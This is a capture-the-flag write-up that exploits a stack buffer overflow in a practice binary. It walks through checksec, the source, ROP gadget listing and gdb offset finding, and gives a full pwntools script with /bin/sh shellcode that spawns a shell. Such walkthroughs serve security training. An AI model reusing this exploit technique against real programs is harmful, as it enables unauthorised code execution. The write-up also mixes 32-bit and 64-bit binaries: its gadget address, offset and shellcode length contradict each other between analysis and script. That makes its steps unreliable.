Let's first check out to see if this challenge has any binary hardening mitigations.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b7$ pwn checksec b7
[*] '/Hackery/escape/buf_ovf/b7/b7'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

So as you can see, we are a bit lucky in the fact that this has no binary hardening. Let's look at the source code.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b7$ cat b7.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void pls_stop()
{
	unsigned int ret_adr;
	char buf0[50];
	fgets(buf0, 100, stdin);
	ret_adr = __builtin_return_address(0);

	if ((ret_adr & 0xf0000000) == 0xf0000000)
	{
		printf("Due to the lack of research, we had to make budget cuts.\n");
		exit(0);
	}
	printf("When you get done with hacking, your research is at %p. Just incase you feel like doing work.\n", ret_adr);
	strdup(buf0);
}

int main()
{
	printf("If you do not get back to your research now, we will have to implement corrective solutions.\n");
	pls_stop();
}
```

So we can see something new with this challenge. After the call to fgets, it checks to see if the return address stored in the rip register starts with a "0xf", and if it does the program kills itself. This sucks for us because all address on the stack (where we could potentially push shellcode), or address from libc (where we could pull the address from system) will just kill the program if we try to call it. However we see something further down. We see that it calls strdup on our input, which should store an address to our input in the rax register (which is a primary I/O register). Let's see if there are any ROP Gadgets that can help us.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b7_64$ ROPgadget --binary b7_64 | grep rax
0x000000000040074d : add byte ptr [rax], al ; add bl, dh ; ret
0x000000000040074b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004005ac : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040074c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004004c3 : add byte ptr [rax], al ; add rsp, 8 ; ret
0x00000000004005ae : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040074e : add byte ptr [rax], al ; ret
0x0000000000400617 : and byte ptr [rax], al ; add ebx, esi ; ret
0x000000000040063e : call rax
0x000000000040072c : fmul qword ptr [rax - 0x7d] ; ret
0x0000000000400639 : int1 ; push rbp ; mov rbp, rsp ; call rax
0x000000000040059d : je 0x4005b8 ; pop rbp ; mov edi, 0x600c08 ; jmp rax
0x00000000004005eb : je 0x400600 ; pop rbp ; mov edi, 0x600c08 ; jmp rax
0x0000000000400638 : je 0x400631 ; push rbp ; mov rbp, rsp ; call rax
0x00000000004005a5 : jmp rax
0x00000000004004c1 : jnp 0x4004cb ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x000000000040063c : mov ebp, esp ; call rax
0x00000000004005a0 : mov edi, 0x600c08 ; jmp rax
0x000000000040063b : mov rbp, rsp ; call rax
0x00000000004005a8 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000400748 : nop dword ptr [rax + rax] ; ret
0x00000000004005f5 : nop dword ptr [rax] ; pop rbp ; ret
0x000000000040059f : pop rbp ; mov edi, 0x600c08 ; jmp rax
0x000000000040063a : push rbp ; mov rbp, rsp ; call rax
0x0000000000400637 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax
0x00000000004005aa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040074a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000400636 : test eax, eax ; je 0x400633 ; push rbp ; mov rbp, rsp ; call rax
0x0000000000400635 : test rax, rax ; je 0x400634 ; push rbp ; mov rbp, rsp ; call rax
```

Here is something interesting...

```
0x000000000040063e : call rax
```

So that will call rax. RAX (which is the 64 bit version of eax) stores an address to our input. So if we hit the eip register with "0x000000000040063e", it will run our input. And since the stack is executable, nothing will stop it. Let's find the offset.

```
gdb-peda$ disas pls_stop
Dump of assembler code for function pls_stop:
   0x0000000000400646 <+0>: push   rbp
   0x0000000000400647 <+1>: mov    rbp,rsp
   0x000000000040064a <+4>: sub    rsp,0x40
   0x000000000040064e <+8>: mov    rdx,QWORD PTR [rip+0x2005bb]        # 0x600c10 <stdin@@GLIBC_2.2.5>
   0x0000000000400655 <+15>:  lea    rax,[rbp-0x40]
   0x0000000000400659 <+19>:  mov    esi,0x64
   0x000000000040065e <+24>:  mov    rdi,rax
   0x0000000000400661 <+27>:  call   0x400510 <fgets@plt>
   0x0000000000400666 <+32>:  mov    rax,QWORD PTR [rbp+0x8]
   0x000000000040066a <+36>:  mov    DWORD PTR [rbp-0x4],eax
   0x000000000040066d <+39>:  mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400670 <+42>:  and    eax,0xf0000000
   0x0000000000400675 <+47>:  cmp    eax,0xf0000000
   0x000000000040067a <+52>:  jne    0x400690 <pls_stop+74>
   0x000000000040067c <+54>:  mov    edi,0x400768
   0x0000000000400681 <+59>:  call   0x4004e0 <puts@plt>
   0x0000000000400686 <+64>:  mov    edi,0x0
   0x000000000040068b <+69>:  call   0x400520 <exit@plt>
   0x0000000000400690 <+74>:  mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400693 <+77>:  mov    esi,eax
   0x0000000000400695 <+79>:  mov    edi,0x4007a8
   0x000000000040069a <+84>:  mov    eax,0x0
   0x000000000040069f <+89>:  call   0x4004f0 <printf@plt>
   0x00000000004006a4 <+94>:  lea    rax,[rbp-0x40]
   0x00000000004006a8 <+98>:  mov    rdi,rax
   0x00000000004006ab <+101>: call   0x400530 <strdup@plt>
   0x00000000004006b0 <+106>: nop
   0x00000000004006b1 <+107>: leave  
   0x00000000004006b2 <+108>: ret    
End of assembler dump.
gdb-peda$ b *pls_stop+32
Breakpoint 1 at 0x400666
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b7_64/b7_64 
If you do not get back to your research now, we will have to implement corrective solutions.
75395128
```

One wall of text later...

```
Breakpoint 1, 0x0000000000400666 in pls_stop ()
gdb-peda$ x/s $rbp-0x40
0x7fffffffde10: "75395128\n"
gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffde60:
 rip = 0x400666 in pls_stop; saved rip = 0x4006cb
 called by frame at 0x7fffffffde70
 Arglist at 0x7fffffffde50, args: 
 Locals at 0x7fffffffde50, Previous frame's sp is 0x7fffffffde60
 Saved registers:
  rbp at 0x7fffffffde50, rip at 0x7fffffffde58
```

And onto the quest for the holy grail...

```
>>> 0x7fffffffde58 - 0x7fffffffde10
72
```

So the offset is 72. For the shellcode we are just going to recycle the shellcode from b5_64, since it is the same architecture it will work. The shellcode we have is 27 charactes long, so our offset only needs to be 45 after it. Now that we have the rop gadget, offset, and shellcode we can write the exploit.

```
#Import pwntools
from pwn import *

#Start the binary
target = process('./b7')

#Print the text from the binary to reach fgets
print target.recvline();

#Create the offset
offset = "0"*32

#Declare the shellcode
shellcode = "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80"

#Declare the ROP Gadget
gadget = p32(0x08048443)

#Construct the payload
payload = shellcode + offset + gadget

#Let's write the payload to a file, for gdb troubleshooting
p = open("in", "w")
p.write(payload)

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
```

Now let's try it...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b7_64$ python exploit.py 
[+] Starting local process './b7_64': Done
If you do not get back to your research now, we will have to implement corrective solutions.

[*] Switching to interactive mode
When you get done with hacking, your research is at 0x40063e. Just incase you feel like doing work.
$ echo lemons
lemons
$ ls
Readme.md  b7_64  b7_64.c  exploit.py  in  out    peda-session-b7_64.txt
$ cat out
If you don't stop, we will start implementing actual security. With guns, and sharks. You hate those, don't you? Level Cleared!
$ exit
[*] Got EOF while reading in interactive
$ exit
[*] Process './b7_64' stopped with exit code 0
[*] Got EOF while sending in interactive
```

Just like that, we pwned the binary. 
